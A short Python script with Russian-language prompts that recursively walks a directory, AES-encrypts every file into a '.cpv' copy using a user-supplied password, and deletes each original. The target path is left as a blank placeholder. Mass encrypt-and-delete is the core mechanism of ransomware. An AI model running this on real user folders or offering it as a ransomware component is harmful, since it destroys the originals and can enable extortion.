import pyAesCrypt
import os


def encryption(file, password):
    buffer_size = 512 * 1024
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + '.cpv',
        password,
        buffer_size
    )
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    os.remove(file)


def walking_by_dir(dir, password):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        else:
            walking_by_dir(path, password)


password = input('Введите пароль для шифрования: ')
walking_by_dir('', password)  # указать путь для шифрования файлов
